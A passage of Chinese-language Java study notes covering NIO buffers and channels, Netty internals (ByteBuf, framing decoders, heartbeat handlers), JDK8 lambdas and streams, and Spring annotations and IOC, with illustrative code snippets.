ByteBuffer.allocate()和ByteBuffer.wrap()对无效内容的字符数组创建的ByteBuffer是写模式，等待程序写入元素

对有效内容的时候是读模式，等待程序读取元素

ByteBuffer.flip()转换ByteBuffer为读模式，limit变成写模式下的position，并会把position值为0

ByteBuffer.clear()转换为写模式

ByteBuffer.hasRemaining()可以知道是否还有写模式的空间或者读模式数据可用



##### Channel

BIO中的流是单向的，而NIO中的Channel是双向的

常见的Channel子类有：

- FileChannel：用于文件数据读写
- DatagramChannel：用于UDP的数据读写
- ServerSocketChannel和SocketChannel用于TCP数据读写



用FIleChannel举个例子，往文件写入数据

```java
public class FileChannel01 {
    public static void main(String[] args) throws Exception{
        String msg = "Hello,Liquid";
        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\ASUS\\Desktop\\hello.txt");
        FileChannel channel = fileOutputStream.getChannel();

        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);
        byteBuffer.put(msg.getBytes());

        byteBuffer.flip();
        channel.write(byteBuffer);

        fileOutputStream.close();

    }
}
```

![1639986175311](java.assets/1639986175311.png)



#### Netty

BossGroup用来接收客户端连接，WorkerGroup用来处理的读写，并用pipeline管道中的handler来处理业务逻辑

![1640071669262](java.assets/1640071669262.png)





##### 三个重要抽象组件

- Channel：代表Socket
  - NioSocketChannel重要子类
- EventLoop：处理连接生命周期中所发生的的事件
- ChannelFuture：异步通知

![1639543712088](java.assets/1639543712088.png)





==ChannelHandler和ChannelPipeline==

ChannelHandler充当了处理入站和出站数据的逻辑容器

- ChannelHandlerAdapter
- ChannelInboundHandlerAdapter
- ChannelOutboundHandlerAdapter
- ChannleDuplexHandler



ChannelPipeline其实就是链表，连接ChannelHandler

![1639543963283](java.assets/1639543963283.png)

##### 引导

引导类为应用程序网络层的配置提供了容器，涉及将一个进程绑定到指定端口（服务器），或者将一个进程连接到另一个运行在某个指定主机端口上的应用（客服端）

上面对应ServerBootStrap和BootStrap

==ServerBootStrap需要两个EventLoopGroup，而BootStrap只需要一个==

原因在于服务器有两组不同的Channel，一组用户绑定本地端口，一组用于处理客户端连接

![1639982194603](java.assets/1639982194603.png)



##### EventLoop

事件循环，基本思想循环遍历处理所有的事件，本质是单线程执行器（维护了一个Selector），里面run方法处理Channel源源不断的数据

下面为EventLoop的类层次结构，基于NIO和并发API上建立

我们看到EventLoop是拥有了任务调度的能力的，并且可以实现了迭代器功能

![1639969389590](java.assets/1639969389590.png)

Netty线程模型的性能在于对当前执行的Thread身份的确定，确定他是否分配给当前Channel以及他的EventLoop的那一线程

如果当前线程是，那么执行提交的代码块，如果不是，加入到队列中



###### fireChannelActive

在channel调用fireChannelActive会调用invokeChannelActive，里面查看下一个handler的eventLoop是不是当前的，如果是直接调用下一个handler，如果不是的话，就需要用下一个handler的eventLoop建立新线程来执行下一个handler

```java
public ChannelHandlerContext fireChannelActive() {
        invokeChannelActive(this.findContextInbound());
        return this;
    }

    static void invokeChannelActive(final AbstractChannelHandlerContext next) {
        EventExecutor executor = next.executor();
        if (executor.inEventLoop()) {
            next.invokeChannelActive();
        } else {
            executor.execute(new Runnable() {
                public void run() {
                    next.invokeChannelActive();
                }
            });
        }

    }
```



##### ByteBuf

Netty自己封装了ByteBuff，内部维护了读位置和写位置，不用像ByteBuff那样用flip来切换模式了

本质就是一个由不同的索引分布控制读访问和写访问的字节数组

![1639569395855](java.assets/1639569395855.png)

###### 直接内存和堆内存

直接内存创建和销毁代价昂贵，但读写性能高，适合配合池化功能使用

直接内存对GC压力小，因为这部分内存不受jvm垃圾回收管理 



###### 池化

池化作用在于可以重用ByteBuf

- 没有池化，每次都要创建新的ByteBuf实例，这个操作对直接内存代价昂贵
- 重用ByteBuf提升分配效率
- 高并发时候，节约内存减少内存溢出



###### ByteBuf分配

ByteBufAllocator实现了池化功能

Unpooled缓冲区，创建的都是非池化的

```java
ByteBuf byteBuf = Unpooled.wrappedBuffer(bytes);
```



###### 零拷贝

可以快速高效的将数据从文件系统移动到网络接口，而不需要将其从内核空间复制到用户空间

如果当前以及创建了两个ByteBuf了，需要把他们两个合并，传统的需要复制他们两个值到一个新的ByteBuf，这之间会涉及到多次拷贝

而使用==CompositeByteBuf==合并两个ByteBuf的话就不需要复制了，相当于复用了两个ByteBuf缓冲区 



**slice**

因为slice是零拷贝，直接对原内存进行分割

如果按照下面的来传输两个切片，将在第一个切片发送后报错。

==原因==是writeInbound发送完数据后会自动释放slice和其对应的byteBuf内存，如果想要成功发送，需要添加一个retain（）在之前

```java
ByteBuf slice = byteBuf.slice(0, 50);
ByteBuf slice1 = byteBuf.slice(50, byteBuf.readableBytes() - 50);
byteBuf.retain();//使引用计数器加1，不被释放
embeddedChannel.writeInbound(slice);
embeddedChannel.writeInbound(slice1);
```



###### 优势

- 池化重用ByteBuf实例
- 读写指针分离，更方便简单
- 可以自动扩容
- 支持链式调用
- 体现了零拷贝



##### 粘包和半包

粘包：多个tcp包一起合并发送

- 原因：
  - 应用层接收方的Bytebuf太大了
  - tcp层的滑动窗口导致：接收方处理不及时且窗口足够大

半包：一个tcp包被分成了多次发送

- 原因：
  - 接收方的Bytebuf太小了
  - 滑动窗口：接收方窗口剩余大小不够容纳发送方的报文大小，只能先存储一点，导致半包

==本质是tcp基于流式协议，消息之间没有边界==



###### 滑动窗口

为什么有滑动窗口？

IP层不可靠，需要TCP层加确认机制来保证，早期发送方发送数据需要添加计时器，如果超时没有收到ACK就重传，这样每个包都需要等待ack确认，降低了通信的效率。

==引入了滑动窗口，窗口大小决定了无需等待应答就可以继续发送的最大值==，实际起到了缓冲区的作用，窗口内的数据才可以发送，当某个段的消息ack发送回来后，那么窗口就可以向后移动



![img](java.assets/20160906072310877)



###### 解决

- 短连接：发送方发送完消息就断开，可以解决粘包问题，但耗费连接资源
- FixLengthFrameDecoder：可以固定接受的长度，但是数据本身长度不够的话，会填充无用的字符
- LinedBasedFrameDecoder：使用换行符来分割数据
- LengthFiledBasedFrameDecoder：会在真实数据前面添加消息的长度





**LengthFiledBasedFrameDecoder**

参数：

- maxFrameLength:帧的最大长度
- lengthFieldOffset：保存数据长度的字段位置
- lengthFiledLength：长度字段的空间大小
- lengthAdjustment：长度域的偏移量矫正
- initialBytesToStrip：剔除长度前面的数据

如果出现了半包现象如下

```java
 ByteBuf slice = byteBuf.slice(0, 50);
 ByteBuf slice1 = byteBuf.slice(50, byteBuf.readableBytes() - 50);
//那么系统会报错
//添加new LengthFieldBasedFrameDecoder(1024,12,4,0,0)
//就会正常接受到包，并且数据没有传输完全的情况，不会给下一个handler
```





##### write和close

write方法常用有两种ctx.write()和ctx.channel().write()

ctx.write()是从当前handler写到离他最近的out handler

而ctx.channel().write()是从流水线最后一直写到头位置

```java
//用ctx.channel().write()，从尾部开始
public final ChannelFuture write(Object msg) {
        return this.tail.write(msg);
    }
//用ctx.write()
 private void write(Object msg, boolean flush, ChannelPromise promise) {
        AbstractChannelHandlerContext next = this.findContextOutbound();
        Object m = this.pipeline.touch(msg, next);
        EventExecutor executor = next.executor();
        if (executor.inEventLoop()) {
            if (flush) {
                next.invokeWriteAndFlush(m, promise);
            } else {
                next.invokeWrite(m, promise);
            }
        }
```

close方法同理



##### Channel和ChannelHandler生命周期

Channel生命周期包括

1. ChannelUnregistered
2. ChannelRegistered
3. ChannelActive（Channel处于连接状态，可以接受和发送数据）
4. ChannelInactive



ChannelHandler生命周期

1. handlerAdded（将ChannleHandler添加到ChannlePipeline链中）
2. handlerRemoved
3. exceptionCaught



##### Handler

ChannelInboundHandler和ChannelOutboundHandler

包含的方法与Channel的生命周期息息相关，在上面状态的基础上还有读写状态改变

如重写channelRead方法，会显示的释放与池化ByteBuf实例相关的内存



而他的子类==SimpleChannelInboundHandler==会自动释放里面相应内存



ChanneloutboundHandler出站操作和数据将由该类负责



##### 资源管理

在调用handler的read和write方法时候，需要确保没有资源泄露

```java
ReleaseCountUtil.release(msg);
```



##### ChannleHandlerContext

代表了ChannleHandler和ChanlePipeline之间的关联，每当ChannleHannler添加到ChannelPipeline中的时候，都会创建对应的ChannelHandlerContext

与之不同的是，调用Channel和ChannlePipeline上的方法会流动整个传播链

==而调用ChannelHandlerContext会从其对应的ChannelHandler出发，并且只会传播给下一个handler==



下图是组件之间的关系

![1639967247136](java.assets/1639967247136.png)



##### 优化与源码

###### Connect_timeout_millis

- 属于socketchannel参数
- 用在客户端建立连接时，如果在指定毫秒内未连接，会跑出timeout异常

在bootstrap的option方法中设置

```java
.option(ChannelOption.CONNECT_TIMEOUT_MILLIS,10000)
```

==源码查看如下==，本质是创建了一个定时任务，如果超时了执行定时任务并设置promise为失败，让主线程通过promise来结束连接

```java
AbstractNioChannel.this.connectTimeoutFuture = AbstractNioChannel.this.eventLoop().schedule(new Runnable() {
   public void run() {
     ChannelPromise connectPromise = AbstractNioChannel.this.connectPromise;
     ConnectTimeoutException cause = new    ConnectTimeoutException("connection timed out: " + remoteAddress);
     if (connectPromise != null && connectPromise.tryFailure(cause)) {
                             AbstractNioUnsafe.this.close(AbstractNioUnsafe.this.voidPromise());
                                    }
                                }
                            }, (long)connectTimeoutMillis, TimeUnit.MILLISECONDS);
```



###### ALLOCATOR

bytebuf默认分配是基于下面配置文件类型

如果是安卓系统就是非池化，如果不是就是默认池化

```java
String allocType = SystemPropertyUtil.get(
                "io.netty.allocator.type", PlatformDependent.isAndroid() ? "unpooled" : "pooled");
```



###### RECVALLOCATOR

决定butebuf的大小和是否是直接内存，与上面的ALLOCATOR配合使用

其也是决定了入站的缓冲大小







###### 连接队列

三次握手时候：

1. client发送SYN给server，状态修改为SYN_SEND，server收到后，状态改为了SYN_REVD，并将请求加入到sync queue队列中
2. server回复SYN+ACK给client，client状态更改为ESTABLISHED，并发送ACK给server
3. server收到ACK后，状态更改为ESTABLISHED，并把请求从syn queue队列中放到accep queue中



==netty中通过，可以控制服务器端==

```JAVA
.option(ChannelOption.SO_BACKLOG,300)
```

**注意**：windows中以netty中为准，而在linux中要根据配置文件和netty中最小值为准



###### 心跳检测

用于在连接中，在客户端没有正常发送数据情况下，确认客户端还存在

客户端配置如下

```java
//这里设置了关心了自己的写事件是否触发，设置了5秒
.addLast(new IdleStateHandler(0,5,0)
.addLast(new ChannelDuplexHandler(){
      @Override
      public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {
          IdleStateEvent evt1 = (IdleStateEvent) evt;
          if(evt1.state()== IdleState.WRITER_IDLE){
          //发送心跳包给服务器，证明还活着
               System.out.println("发送心跳包给服务器");
               ctx.writeAndFlush(new PingMessage());
           }
         }
  })
```

服务器设置如下

服务器设置了关心有没有读取到客户端发送消息的事件，设置等待7秒

如果没有收到心跳包消息那么就会断开与客户端联系

```java
.addLast(new IdleStateHandler(7,0,0))
.addLast(new ChannelDuplexHandler(){
    @Override
      public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {
         IdleStateEvent evt1 = (IdleStateEvent) evt;
         if(evt1.state()== IdleState.READER_IDLE){
         //没有收到回复直接断开
         ctx.channel().close();
                                            }
                                        }
                                    })
```



### JDK8新特性

#### Lambda表达式

##### 标准格式

()->{
            System.out.println("女孩大大");
        }

()参数列表

->没有意义

{}方法体内容



解决匿名内部类过于冗长的问题，下面这个如果不用lambda很繁琐

```java
public class FuncInterTest {
    public static void main(String[] args) {
        new Boy(()->{
            System.out.println("女孩大大");
        }).start();
    }
}
//不用lambda
public class FuncInterTest {
    public static void main(String[] args) {
       new Boy(new Girl() {
            @Override
            public void buy() {
                System.out.println("女孩大大");
            }
        }).start();
    }
}
@FunctionalInterface
interface Girl{
    public void buy();
}
class Boy{
    Girl girl;
    Boy(Girl girl){
        this.girl = girl;
    }
    void start(){
        girl.buy();
    }
}

```

可以从上面看到要实现lambda表达式，匿名类必须是个接口，并且有==@FunctionalInterface==注解，该注解会检测接口里面提供只提供一个抽象方法，当然也可以不添加@FunctionalInterface注解

lambda还在运行时候生成一个内部类，重写接口方法为lambda定义的实现



##### lambda省略格式

1. 小括号内参数类型可以省略

2. 小括号只有一个参数，可以省略小括号

3. 大括号内只有一个语句，可以省略大括号、return语句和语句分号

   ```java
   new Boy((int money)->{
               return money>0;
           }).start(5);
   省略后
   new Boy(money-> money>0).start(5);
   ```



##### 匿名内部类和lambda的区别

- 所需类型不一样
  - 匿名内部类可以是类、接口、抽象类
  - lambda必须为接口
- 抽象方法数量不一样
  - 匿名内部类可以是多个方法
  - lambda必须只有一个
- 实现原理不一样
  - 匿名内部类是编译器生成class，其会为每个匿名内部类生成一个类
  - lambda是在运行时候生成class，lambda表达式不会生成一个类



#### 接口的默认方法和静态方法

##### 默认方法

接口的默认方法不会使得实现类必须去重写，减小了实现类的工作量，方便扩展

格式为

```java
interface 接口名{
	修饰符 default 返回值类型 方法名(){
        代码;
    }
}
```



使用方法：

1. 实现类直接使用

   ```java
   public class InterfaceTest {
       public static void main(String[] args) {
           A a = new B();
           a.haha();
       }
   }
   interface A{
       default void haha(){
           System.out.println("hahh");
       }
   }
   class B implements A{
   
   }
   ```

   

2. 实现类对其重写



##### 静态方法

```java
interface 接口名{
	修饰符 static 返回值类型 方法名(){
        代码;
    }
}
```

接口名直接调用方法名来使用静态方法

但注意静态方法不允许继承和重写

```java
public class InterfaceTest {
    public static void main(String[] args) {
        A.haha();
    }
}
interface A{
    static void haha(){
        System.out.println("hahh");
    }
}
```



#### 方法引用

符号表示   **：：**

应用场景 lambda所要实现的方案在其他方法中已经实现过了，直接使用方法引用对应方法



常见引用方式

1. instanceName::methodName 对象：：方法名

   ```java
   public class InterfaceTest {
       public static void main(String[] args) {
           InterfaceTest interfaceTest = new InterfaceTest();
           interfaceTest.print(interfaceTest::haha);
       }
       public void print(A a){
           a.hah();
       }
       public void haha(){
           System.out.println("haha");
       }
       interface A{
           void hah();
       }
   }
   
   ```

2. className::staticMethodName 类名：：静态方法名

   ```java
   public class InterfaceTest {
       public static void main(String[] args) {
           InterfaceTest interfaceTest = new InterfaceTest();
           interfaceTest.print(InterfaceTest::haha);
       }
       public void print(A a){
           a.hah();
       }
       public static void haha(){
           System.out.println("haha");
       }
       interface A{
           void hah();
       }
   }
   
   ```

   

3. className::methonName 类名：：方法名

4. className::new 类名：：new构造函数

5. TypeName[]::new String[]:new 调用数组构造函数



#### 内置函数接口

以下接口都存在在java.util.function包中



Consumer接口：Consumer< T> void accept(T t)有参数，无返回值的抽象方法

Supplier接口“：Supplier < T> T get() 无参有返回值的抽象方法

断定型接口: Predicate<T> boolean test(T t):有参，但是返回值类型是固定的boolean

函数型接口: Function<T,R> R apply(T t)有参有返回值的抽象方法；



#### stream流

> 优点：没有显示的循环操作；提供了声明式的处理函数；流畅式接口，方法调用连接在一起

java提供的对数组和集合的流式操作

```java
@Test
public void test() {
  List<String> strings = Arrays.asList("abc", "def", "gkh", "abc");
    //返回符合条件的stream
    Stream<String> stringStream = strings.stream().filter(s -> "abc".equals(s));
    //计算流符合条件的流的数量
    long count = stringStream.count();

    //forEach遍历->打印元素
    strings.stream().forEach(System.out::println);

    //limit 获取到1个元素的stream
    Stream<String> limit = strings.stream().limit(1);
    //toArray 比如我们想看这个limitStream里面是什么，比如转换成String[],比如循环
    String[] array = limit.toArray(String[]::new);

    //map 对每个元素进行操作返回新流
    Stream<String> map = strings.stream().map(s -> s + "22");

    //sorted 排序并打印
    strings.stream().sorted().forEach(System.out::println);

    //Collectors collect 把abc放入容器中
    List<String> collect = strings.stream().filter(string -> "abc".equals(string)).collect(Collectors.toList());
    //把list转为string，各元素用，号隔开
    String mergedString = strings.stream().filter(string -> !string.isEmpty()).collect(Collectors.joining(","));

    //对数组的统计，比如用
    List<Integer> number = Arrays.asList(1, 2, 5, 4);

    IntSummaryStatistics statistics = number.stream().mapToInt((x) -> x).summaryStatistics();
    System.out.println("列表中最大的数 : "+statistics.getMax());
    System.out.println("列表中最小的数 : "+statistics.getMin());
    System.out.println("平均数 : "+statistics.getAverage());
    System.out.println("所有数之和 : "+statistics.getSum());

    //concat 合并流
    List<String> strings2 = Arrays.asList("xyz", "jqx");
    Stream.concat(strings2.stream(),strings.stream()).count();

    //注意 一个Stream只能操作一次，不能断开，否则会报错。
    Stream stream = strings.stream();
    //第一次使用
    stream.limit(2);
    //第二次使用
    stream.forEach(System.out::println);
    //报错 java.lang.IllegalStateException: stream has already been operated upon or closed

    //但是可以这样, 连续使用
    stream.limit(2).forEach(System.out::println);
}

```







#### Optional

阿里巴巴建议使用Optional来解决空指针问题

解决正常情况下if层层叠判断对象是否为空的问题



判断person对象是否为空。不为空判断他的名字属性是否为空，不为空就输出他的名字

```java
Optional.ofNullable(person).map(o->o.getName()).ifPresent(o->{
            System.out.println(o);
        });
```











## 项目过程

- 启动，可行性分析，立项，了解项目背景
- 计划阶段：进度安排，资源计划，成本估计，质量保证计划，风险考虑，实施细节
- 实施阶段：开发，测试，上线
- 收尾







## WEB

正向代理

客户端想要访问原始服务器，无法访问

![img](java.assets/v2-57472d50305b1525ecdc871cd811aa20_b.jpg)

反向代理

客户端访问的原始服务器就是代理服务器，代理服务器再根据需求转到其他服务器



![img](java.assets/v2-eaba088b240eabe8d30e8dbff4cc1dc5_b.jpg)







## Spring

### 注解

#### @Configuration

本质是使用了@Component注解，用来替代spring的application.xml文件，被此注解修饰的类会被自动装载到容器

使用场景：用于编写配置的类，通常使用次注解。该注解写到主配置类上，其他配置类被@Import注解导入到主配置类中。

```java
@Configuration
//导入另外一个副配置文件
@Import(JdbcConfiguration.class)
public class SpringConfiguration 
```



```java
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Component
public @interface Configuration 
```



#### @ComponetScan

用来扫描@Componet及其衍生类注解，负责把他们注入到容器中。

```java
@ComponentScan(value = "com.cuit.service")
```

这里主要到@Componet这些默认不给value值也会有名字，跟着spring代码查看命名规则

会在**AnnotatedBeanDefinitionReader**这个类上区获取beanName的名字

```java
String beanName = (name != null ? name : this.beanNameGenerator.generateBeanName(abd, this.registry));
```

上面我们注意到是用了**beanNameGenerator**去生成beanName，该类的接口为，定义生成beanName的方法

```java
public interface BeanNameGenerator {
    String generateBeanName(BeanDefinition var1, BeanDefinitionRegistry var2);
}
```

跟到其子类**AnnotationBeanNameGenerator**，可以看到大概是**determineBeanNameFromAnnotation**有值得话就直接输出名字，没有的话生成默认名字

```java
if (definition instanceof AnnotatedBeanDefinition) {
			String beanName = determineBeanNameFromAnnotation((AnnotatedBeanDefinition) definition);
			if (StringUtils.hasText(beanName)) {
				// Explicit bean name found.
				return beanName;
			}
		}
		// Fallback: generate a unique default bean name.
		return buildDefaultBeanName(definition, registry);
```

我们继续跟进到**determineBeanNameFromAnnotation**里面，大概规则是获取类上的所有注解，for循环遍历注解获得其属性，判断其实不是@component注解，如果是的话获取其属性值value，没有的话返回null

```java
protected String determineBeanNameFromAnnotation(AnnotatedBeanDefinition annotatedDef) {
		AnnotationMetadata amd = annotatedDef.getMetadata();
		Set<String> types = amd.getAnnotationTypes();
		String beanName = null;
		for (String type : types) {
			AnnotationAttributes attributes = AnnotationConfigUtils.attributesFor(amd, type);
			if (isStereotypeWithNameValue(type, amd.getMetaAnnotationTypes(type), attributes)) {
				Object value = attributes.get("value");
				if (value instanceof String) {
					String strVal = (String) value;
					if (StringUtils.hasLength(strVal)) {
						if (beanName != null && !strVal.equals(beanName)) {
							throw new IllegalStateException("Stereotype annotations suggest inconsistent " +
									"component names: '" + beanName + "' versus '" + strVal + "'");
						}
						beanName = strVal;
					}
				}
			}
		}
		return beanName;
	}
```

我们再看一下没有设置属性的话，默认名字的代码，可以看到是截取为类名并且是把首字母小写，这就是spring容器给bean命名规则

```java
	protected String buildDefaultBeanName(BeanDefinition definition) {
		String shortClassName = ClassUtils.getShortName(definition.getBeanClassName());
		return Introspector.decapitalize(shortClassName);
	}
```

==这里我们可以自己写一个beanNameGenerator==步骤如下

1. 编写beanNameGenerator的子类

   1. ​	这里我设置如果没有设置属性值得话，自动命名为liquid，当然这里随便乱写的

      ```java
      public class LiquidNameGen implements BeanNameGenerator{
          private static final String COMPONENT_ANNOTATION_CLASSNAME = "org.springframework.stereotype.Component";
          public String generateBeanName(BeanDefinition beanDefinition, BeanDefinitionRegistry beanDefinitionRegistry) {
              String beanName = null;
              if(beanDefinition instanceof AnnotatedBeanDefinition){
                  AnnotatedBeanDefinition beanDefinition1 = (AnnotatedBeanDefinition) beanDefinition;
                  AnnotationMetadata metadata = beanDefinition1.getMetadata();
                  //获取bean的所有定义信息
                  Set<String> annotationTypes = metadata.getAnnotationTypes();
                  for(String type:annotationTypes){
                      //拿到注解的属性
                      AnnotationAttributes annotationAttributes = AnnotationAttributes.fromMap(metadata.getAnnotationAttributes(type));
                      //判断属性是否为null，同时必须是@componet及其衍生注解
                      if (isStereotypeWithNameValue(type, metadata.getMetaAnnotationTypes(type), annotationAttributes)) {
                          Object value = annotationAttributes.get("value");
                          if (value instanceof String) {
                              String strVal = (String) value;
                              if (StringUtils.hasLength(strVal)) {
                                  if (beanName != null && !strVal.equals(beanName)) {
                                      throw new IllegalStateException("Stereotype annotations suggest inconsistent " +
                                              "component names: '" + beanName + "' versus '" + strVal + "'");
                                  }
                                  beanName = strVal;
                              }
                          }
                      }
                  }
              }
              return beanName!=null?beanName:"liquid";
          }
          protected boolean isStereotypeWithNameValue(String annotationType,
                                                      Set<String> metaAnnotationTypes, Map<String, Object> attributes) {
      
              boolean isStereotype = annotationType.equals(COMPONENT_ANNOTATION_CLASSNAME) ||
                      (metaAnnotationTypes != null && metaAnnotationTypes.contains(COMPONENT_ANNOTATION_CLASSNAME)) ||
                      annotationType.equals("javax.annotation.ManagedBean") ||
                      annotationType.equals("javax.inject.Named");
      
              return (isStereotype && attributes != null && attributes.containsKey("value"));
          }
      }
      ```

      

2. 设置其到@ComponetScan注解的属性nameGenerator中替换原本的类

```java
@ComponentScan(value = "com.cuit.service",nameGenerator = LiquidNameGen.class)
```



#### @Bean

一般就用在方法上，把方法返回的对象存储到IOC容器中

默认以方法名作为bean的名字

```java
	@Bean
    public JdbcTemplate createJdbcTemplate(DataSource dataSource){
        return new JdbcTemplate(dataSource);
    }
```



#### @Import

可以导入另外一个配置文件到**Import**注解所在的配置文件中，该注解也会把value值里面的类注册到容器中，这里通过**@import**导入的类的名字是该类的全限定名，而不是类名的小写了

```java
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface Import {

	/**
	 * {@link Configuration}, {@link ImportSelector}, {@link ImportBeanDefinitionRegistrar}
	 * or regular component classes to import.
	 */
	Class<?>[] value();

}
```



##### 高级应用

用于加载自定义的注解类或者不需要spring原生的注解来注册类到容器，需要实现类**ImportBeanDefinitionRegistrar**或者**ImportSelector**这两个类

比如我这里不需要用@bean或者@component注解来注册类，直接加载指定路径下的类

1、实现**ImportBeanDefinitionRegistrar**

```java
public class MyImportRegistryt implements ImportBeanDefinitionRegistrar {
    private String expression = null;
    private String packages = null;
    private static final String PACKAGE = "custom.package";
    private static final String  EXPRESSION = "custom.expression";

    public MyImportRegistryt() {
        try{
            Properties properties = PropertiesLoaderUtils.loadAllProperties("importRegis.properties");
            expression = properties.getProperty(EXPRESSION);
            packages = properties.getProperty(PACKAGE);
        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public void registerBeanDefinitions(AnnotationMetadata importingClassMetadata, BeanDefinitionRegistry registry) {
        ClassPathBeanDefinitionScanner classPathBeanDefinitionScanner = new ClassPathBeanDefinitionScanner(registry,false);
        AspectJTypeFilter aspectJTypeFilter = new AspectJTypeFilter(expression,MyImportRegistryt.class.getClassLoader());
        classPathBeanDefinitionScanner.addIncludeFilter(aspectJTypeFilter);
        classPathBeanDefinitionScanner.scan(packages);
    }
}

//指定配置文件
custom.expression=com.cuit.importTest.service..*
custom.package=com.cuit.importTest.service
```

2、导入该类到配置中

```java
@Configuration
@Import(MyImportRegistryt.class)
public class SpringImportConfiguration {
}
```

这样就可以注册com.cuit.importTest.service包下的类



==其实spring的原生注解==@componet就是实现了上面方法来达到的



#### 注解注入时机和设定条件

##### @DependsOn

使用此注解指定bean的创建顺序

```java
@Target({ElementType.TYPE, ElementType.METHOD})
@Retention(RetentionPolicy.RUNTIME)
@Documented
public @interface DependsOn {

	String[] value() default {};

}
```

下面的**EventListener**在**eventSource**创建之后

```java
@Component
@DependsOn("eventSource")
public class EventListener {
    public EventListener() {
        System.out.println("监听器创建");
    }
}
```



##### @Conditional

```java
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.TYPE, ElementType.METHOD})
public @interface Conditional {

	/**
	 * All {@link Condition}s that must {@linkplain Condition#matches match}
	 * in order for the component to be registered.
	 */
	Class<? extends Condition>[] value();

}
```



考虑有不同环境的情况下，需要切换数据库

这下面使用windows数据库就需要满足Conditional中的WindowsConditoion条件，同理linux也是

```java
@Bean("dataSource")
    @Conditional(WindowsCondition.class)
    public DataSource createWindowsDataSource(){
        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
        driverManagerDataSource.setDriverClassName(driver);
        driverManagerDataSource.setUrl(url);
        driverManagerDataSource.setUsername(username);
        driverManagerDataSource.setPassword(password);
        return driverManagerDataSource;
    }

    @Bean("dataSource")
    @Conditional(LinuxCondition.class)
    public DataSource createLinuxDataSource(@Value("${linux.jdbc.driver}") String linuxDriver,@Value("${linux.jdbc.url}")String linuxUrl,
                                       @Value("${linux.jdbc.username}")String linuxUsername,@Value("${linux.jdbc.password}")String linuxPassword){
        DriverManagerDataSource driverManagerDataSource = new DriverManagerDataSource();
        driverManagerDataSource.setDriverClassName(linuxDriver);
        driverManagerDataSource.setUrl(linuxUrl);
        driverManagerDataSource.setUsername(linuxUsername);
        driverManagerDataSource.setPassword(linuxPassword);
        return driverManagerDataSource;
    }
```

实现Condition接口,判断当前环境是windows吗，如果是就允许注册对象，如果不是就不允许

```java
public class WindowsCondition implements Condition{
    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
        Environment environment = context.getEnvironment();
        String osName = environment.getProperty("os.name");
        if(osName.contains("Windows")){
            return true;
        }
        return false;
    }
}

public class LinuxCondition implements Condition {
    public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
        Environment environment = context.getEnvironment();
        String osName = environment.getProperty("os.name");
        if(osName.contains("Linux")){
            return true;
        }
        return false;
    }
}
```

##### @Profile

用于配置切换环境一般为@Profile("test")

可以看到该注解下有**@Conditional(ProfileCondition.class)**，需要符合里面类的条件才能把**@Profile**修辞的注解的类注册到容器

```java
@Retention(RetentionPolicy.RUNTIME)
@Target({ElementType.TYPE, ElementType.METHOD})
@Documented
@Conditional(ProfileCondition.class)
public @interface Profile {

	/**
	 * The set of profiles for which the annotated component should be registered.
	 */
	String[] value();

}
```

**ProfileCondition**可以看到该类用来判断当前环境下profile的值active环境是否对应value中的test值，如果对应，那么返回true

```java
class ProfileCondition implements Condition {

	@Override
	public boolean matches(ConditionContext context, AnnotatedTypeMetadata metadata) {
		if (context.getEnvironment() != null) {
			MultiValueMap<String, Object> attrs = metadata.getAllAnnotationAttributes(Profile.class.getName());
			if (attrs != null) {
				for (Object value : attrs.get("value")) {
					if (context.getEnvironment().acceptsProfiles(((String[]) value))) {
						return true;
					}
				}
				return false;
			}
		}
		return true;
	}

}
```

那么acitve环境对应的注解为**@ActiveProfiles("test")**，表test明当前激活环境为test



#### @EnableAspectJAutoProxy

开启aop自动代理

proxyTargetClass默认为false使用jdk代理，为true使用cglib代理

```java
@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Import(AspectJAutoProxyRegistrar.class)
public @interface EnableAspectJAutoProxy {
    /**
	 * Indicate whether subclass-based (CGLIB) proxies are to be created as opposed
	 * to standard Java interface-based proxies. The default is {@code false}.
	 */
	boolean proxyTargetClass() default false;

	/**
	 * Indicate that the proxy should be exposed by the AOP framework as a {@code ThreadLocal}
	 * for retrieval via the {@link org.springframework.aop.framework.AopContext} class.
	 * Off by default, i.e. no guarantees that {@code AopContext} access will work.
	 * @since 4.3.1
	 */
	boolean exposeProxy() default false;

}
```

该注解会导入**AspectJAutoProxyRegistrar**类，该类实现了**ImportBeanDefinitionRegistrar**，用来注册指定类到容器，该类下面的一个方法就是在注册类到容器，如下

```java
AopConfigUtils.registerAspectJAnnotationAutoProxyCreatorIfNecessary(registry);
//最终会把AnnotationAwareAspectJAutoProxyCreator.class注册到容器，beanDefinition就是那个类
registry.registerBeanDefinition("org.springframework.aop.config.internalAutoProxyCreator", beanDefinition);
```



#### @Pointcut

切入点表达式，其他切面的其他通知要使用的话，直接引用pointcut的全限定方法名

```java
@Component
@Aspect
public class LogUtil {

    @Pointcut(value="execution(* com.cuit.config.Aspect.*.*(..))")
    private void pointcut1(){

    }

    @Before("com.cuit.config.utils.LogUtil.pointcut1()")
    public void printLog(){
        System.out.println("打印日志");
    }
}
```



#### 扩展目标类

##### @DeclareParents

类级别增强





### IOC

控制反转，就是把java对象生成交给了spring来管理

对象谁来创建？

spring容器

对象如何创建？

使用反射

```java
Class clazz =  Person.class;
Constructor ctor = clazz.getConstructor();
Object obj =  ctor.newInstance();
```



#### IOC容器设计与实现

有两个主要容器系列：一个是beanFactory接口的简单容器系列，只实现了容器最基本的功能；一个是ApplicationContext，他作为容器高级形态





在spring中，实际是把DefaultListableBeanFactory作为一个默认的完整IOC容器使用。

spring通过定义BeanDefintion来管理基于spring的各种对象及其依赖关系。BeanDefintion抽象了我们对Bean的定义



#### beanFactory

其中**ListBeanFactory**和**HierarchicalBeanFactory**是两个不同分支的实现



**ApplicationContext**

```
继承了他们两个，是高级实现类
提供了国家化支持MessageSource接口
发布应用文上下文事件ApplicationEventPublisher
丰富资源获取功能ResourcePatternResolver
```

**ConfigurableApplicationContext**
